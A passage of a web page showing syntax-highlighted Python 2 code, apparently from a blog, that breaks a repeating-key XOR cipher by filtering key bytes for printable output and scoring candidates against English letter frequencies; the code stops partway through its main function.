</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-67><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-67> 67</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-68><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-68> 68</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-69><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-69> 69</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-70><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-70> 70</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-71><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-71> 71</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-72><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-72> 72</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-73><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-73> 73</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-74><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-74> 74</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-75><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-75> 75</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-76><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-76> 76</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-77><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-77> 77</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-78><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-78> 78</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-79><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-79> 79</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-80><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-80> 80</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-81><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-81> 81</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-82><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-82> 82</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-83><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-83> 83</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-84><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-84> 84</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-85><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-85> 85</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-86><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-86> 86</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-87><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-87> 87</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-88><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-88> 88</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-89><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-89> 89</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-90><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-90> 90</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-91><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-91> 91</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-92><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-92> 92</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-93><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-93> 93</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-94><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-94> 94</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-95><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-95> 95</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-96><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-96> 96</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-97><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-97> 97</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-98><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-98> 98</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-99><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-99> 99</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-100><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-100>100</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-101><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-101>101</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-102><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-102>102</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-103><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-103>103</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-104><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-104>104</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-105><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-105>105</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-106><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-106>106</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-107><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-107>107</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-108><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-108>108</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-109><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-109>109</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-110><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-110>110</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-111><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-111>111</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-112><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-112>112</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-113><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-113>113</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-114><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-114>114</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-115><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-115>115</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-116><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-116>116</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-117><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-117>117</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-118><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-118>118</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-119><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-119>119</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-120><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-120>120</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-121><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-121>121</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-122><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-122>122</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-123><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-123>123</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-124><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-124>124</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-125><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-125>125</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-126><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-126>126</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-127><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-127>127</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-128><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-128>128</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-129><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-129>129</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-130><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-130>130</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-131><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-131>131</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-132><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-132>132</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-133><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-133>133</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-134><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-134>134</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-135><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-135>135</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-136><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-136>136</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-137><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-137>137</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-138><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-138>138</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-139><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-139>139</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># coding:utf8</span>
</span></span><span style=display:flex><span><span style=color:#75715e># by https://findneo.github.io/</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>getCipher</span>(file<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;code.txt&#39;</span>):
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;&#39;&#39;从文件中读取十六进制串，返回十六进制数组
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>    c<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join(map(<span style=color:#66d9ef>lambda</span> x:x<span style=color:#f92672>.</span>strip(),open(<span style=color:#e6db74>&#39;cipher.txt&#39;</span>)<span style=color:#f92672>.</span>readlines()))<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;base_64&#39;</span>)
</span></span><span style=display:flex><span>    cc<span style=color:#f92672>=</span> [ord(i) <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> c]
</span></span><span style=display:flex><span>    <span style=color:#75715e># print cc,len(cc)</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> cc
</span></span><span style=display:flex><span>    <span style=color:#75715e># c = open(file).read()</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># codeintlist = []</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># codeintlist.extend(</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>#     (map(lambda i: int(c[i:i + 2], 16), range(0, len(c), 2))))</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># return codeintlist</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>getKeyPool</span>(cipher, stepSet, plainSet, keySet):
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;&#39;&#39; 传入的密文串、明文字符集、密钥字符集、密钥长度范围均作为数字列表处理.形如[0x11,0x22,0x33]
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        返回一个字典，以可能的密钥长度为键，以对应的每一字节的密钥字符集构成的列表为值，密钥字符集为数字列表。
</span></span></span><span style=display:flex><span><span style=color:#e6db74>            形如{
</span></span></span><span style=display:flex><span><span style=color:#e6db74>                    1:[[0x11]],
</span></span></span><span style=display:flex><span><span style=color:#e6db74>                    3:[
</span></span></span><span style=display:flex><span><span style=color:#e6db74>                        [0x11,0x33,0x46],
</span></span></span><span style=display:flex><span><span style=color:#e6db74>                        [0x22,0x58],
</span></span></span><span style=display:flex><span><span style=color:#e6db74>                        [0x33]
</span></span></span><span style=display:flex><span><span style=color:#e6db74>                       ]
</span></span></span><span style=display:flex><span><span style=color:#e6db74>                }
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>    keyPool <span style=color:#f92672>=</span> dict()
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> step <span style=color:#f92672>in</span> stepSet:
</span></span><span style=display:flex><span>        maybe <span style=color:#f92672>=</span> [<span style=color:#66d9ef>None</span>] <span style=color:#f92672>*</span> step
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> pos <span style=color:#f92672>in</span> xrange(step):
</span></span><span style=display:flex><span>            maybe[pos] <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>for</span> k <span style=color:#f92672>in</span> keySet:
</span></span><span style=display:flex><span>                flag <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>for</span> c <span style=color:#f92672>in</span> cipher[pos::step]:
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span> c <span style=color:#f92672>^</span> k <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> plainSet:
</span></span><span style=display:flex><span>                        flag <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> flag:
</span></span><span style=display:flex><span>                    maybe[pos]<span style=color:#f92672>.</span>append(k)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> posPool <span style=color:#f92672>in</span> maybe:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> len(posPool) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>:
</span></span><span style=display:flex><span>                maybe <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> len(maybe) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>:
</span></span><span style=display:flex><span>            keyPool[step] <span style=color:#f92672>=</span> maybe
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> keyPool
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>calCorrelation</span>(cpool):
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;&#39;&#39;传入字典，形如{&#39;e&#39;:2,&#39;p&#39;:3}
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        返回可能性，0~1,值越大可能性越大
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        (correlation between the decrypted column letter frequencies and
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        the relative letter frequencies for normal English text)
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>    frequencies <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;e&#34;</span>: <span style=color:#ae81ff>0.12702</span>, <span style=color:#e6db74>&#34;t&#34;</span>: <span style=color:#ae81ff>0.09056</span>, <span style=color:#e6db74>&#34;a&#34;</span>: <span style=color:#ae81ff>0.08167</span>, <span style=color:#e6db74>&#34;o&#34;</span>: <span style=color:#ae81ff>0.07507</span>, <span style=color:#e6db74>&#34;i&#34;</span>: <span style=color:#ae81ff>0.06966</span>,
</span></span><span style=display:flex><span>                   <span style=color:#e6db74>&#34;n&#34;</span>: <span style=color:#ae81ff>0.06749</span>, <span style=color:#e6db74>&#34;s&#34;</span>: <span style=color:#ae81ff>0.06327</span>, <span style=color:#e6db74>&#34;h&#34;</span>: <span style=color:#ae81ff>0.06094</span>, <span style=color:#e6db74>&#34;r&#34;</span>: <span style=color:#ae81ff>0.05987</span>, <span style=color:#e6db74>&#34;d&#34;</span>: <span style=color:#ae81ff>0.04253</span>,
</span></span><span style=display:flex><span>                   <span style=color:#e6db74>&#34;l&#34;</span>: <span style=color:#ae81ff>0.04025</span>, <span style=color:#e6db74>&#34;c&#34;</span>: <span style=color:#ae81ff>0.02782</span>, <span style=color:#e6db74>&#34;u&#34;</span>: <span style=color:#ae81ff>0.02758</span>, <span style=color:#e6db74>&#34;m&#34;</span>: <span style=color:#ae81ff>0.02406</span>, <span style=color:#e6db74>&#34;w&#34;</span>: <span style=color:#ae81ff>0.02360</span>,
</span></span><span style=display:flex><span>                   <span style=color:#e6db74>&#34;f&#34;</span>: <span style=color:#ae81ff>0.02228</span>, <span style=color:#e6db74>&#34;g&#34;</span>: <span style=color:#ae81ff>0.02015</span>, <span style=color:#e6db74>&#34;y&#34;</span>: <span style=color:#ae81ff>0.01974</span>, <span style=color:#e6db74>&#34;p&#34;</span>: <span style=color:#ae81ff>0.01929</span>, <span style=color:#e6db74>&#34;b&#34;</span>: <span style=color:#ae81ff>0.01492</span>,
</span></span><span style=display:flex><span>                   <span style=color:#e6db74>&#34;v&#34;</span>: <span style=color:#ae81ff>0.00978</span>, <span style=color:#e6db74>&#34;k&#34;</span>: <span style=color:#ae81ff>0.00772</span>, <span style=color:#e6db74>&#34;j&#34;</span>: <span style=color:#ae81ff>0.00153</span>, <span style=color:#e6db74>&#34;x&#34;</span>: <span style=color:#ae81ff>0.00150</span>, <span style=color:#e6db74>&#34;q&#34;</span>: <span style=color:#ae81ff>0.00095</span>,
</span></span><span style=display:flex><span>                   <span style=color:#e6db74>&#34;z&#34;</span>: <span style=color:#ae81ff>0.00074</span>}
</span></span><span style=display:flex><span>    relative <span style=color:#f92672>=</span> <span style=color:#ae81ff>0.0</span>
</span></span><span style=display:flex><span>    total <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>    fpool <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;etaoinshrdlcumwfgypbvkjxqz&#39;</span>
</span></span><span style=display:flex><span>    total <span style=color:#f92672>=</span> sum(cpool<span style=color:#f92672>.</span>values())  <span style=color:#75715e># 总和应包括字母和其他可见字符</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> cpool<span style=color:#f92672>.</span>keys():
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> i <span style=color:#f92672>in</span> fpool:
</span></span><span style=display:flex><span>            relative <span style=color:#f92672>+=</span> frequencies[i] <span style=color:#f92672>*</span> cpool[i] <span style=color:#f92672>/</span> total
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> relative
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>analyseFrequency</span>(cfreq):
</span></span><span style=display:flex><span>    key <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> posFreq <span style=color:#f92672>in</span> cfreq:
</span></span><span style=display:flex><span>        mostRelative <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> keyChr <span style=color:#f92672>in</span> posFreq<span style=color:#f92672>.</span>keys():
</span></span><span style=display:flex><span>            r <span style=color:#f92672>=</span> calCorrelation(posFreq[keyChr])
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> r <span style=color:#f92672>&gt;</span> mostRelative:
</span></span><span style=display:flex><span>                mostRelative <span style=color:#f92672>=</span> r
</span></span><span style=display:flex><span>                keychar <span style=color:#f92672>=</span> keyChr
</span></span><span style=display:flex><span>        key<span style=color:#f92672>.</span>append(keychar)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> key
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>getFrequency</span>(cipher, keyPoolList):
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;&#39;&#39; 传入的密文作为数字列表处理
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        传入密钥的字符集应为列表，依次包含各字节字符集。
</span></span></span><span style=display:flex><span><span style=color:#e6db74>            形如[[0x11,0x12],[0x22]]
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        返回字频列表，依次为各字节字符集中每一字符作为密钥组成部分时对应的明文字频
</span></span></span><span style=display:flex><span><span style=color:#e6db74>            形如[{
</span></span></span><span style=display:flex><span><span style=color:#e6db74>                    0x11:{&#39;a&#39;:2,&#39;b&#39;:3},
</span></span></span><span style=display:flex><span><span style=color:#e6db74>                    0x12:{&#39;e&#39;:6}
</span></span></span><span style=display:flex><span><span style=color:#e6db74>                 },
</span></span></span><span style=display:flex><span><span style=color:#e6db74>                 {
</span></span></span><span style=display:flex><span><span style=color:#e6db74>                    0x22:{&#39;g&#39;:1}
</span></span></span><span style=display:flex><span><span style=color:#e6db74>                 }]
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>    freqList <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>    keyLen <span style=color:#f92672>=</span> len(keyPoolList)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> xrange(keyLen):
</span></span><span style=display:flex><span>        posFreq <span style=color:#f92672>=</span> dict()
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> k <span style=color:#f92672>in</span> keyPoolList[i]:
</span></span><span style=display:flex><span>            posFreq[k] <span style=color:#f92672>=</span> dict()
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>for</span> c <span style=color:#f92672>in</span> cipher[i::keyLen]:
</span></span><span style=display:flex><span>                p <span style=color:#f92672>=</span> chr(k <span style=color:#f92672>^</span> c)
</span></span><span style=display:flex><span>                posFreq[k][p] <span style=color:#f92672>=</span> posFreq[k][p] <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span> <span style=color:#66d9ef>if</span> p <span style=color:#f92672>in</span> posFreq[k] <span style=color:#66d9ef>else</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>        freqList<span style=color:#f92672>.</span>append(posFreq)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> freqList
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>vigenereDecrypt</span>(cipher, key):
</span></span><span style=display:flex><span>    plain <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span>    cur <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>    ll <span style=color:#f92672>=</span> len(key)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> c <span style=color:#f92672>in</span> cipher:
</span></span><span style=display:flex><span>        plain <span style=color:#f92672>+=</span> chr(c <span style=color:#f92672>^</span> key[cur])
</span></span><span style=display:flex><span>        cur <span style=color:#f92672>=</span> (cur <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>%</span> ll
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> plain
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
</span></span><span style=display:flex><span>    ps <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>    ks <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>    ss <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>    ps<span style=color:#f92672>.</span>extend(xrange(<span style=color:#ae81ff>0xff</span>))
</span></span><span style=display:flex><span>    ks<span style=color:#f92672>.</span>extend(xrange(<span style=color:#ae81ff>0x20</span>,<span style=color:#ae81ff>0x80</span>))
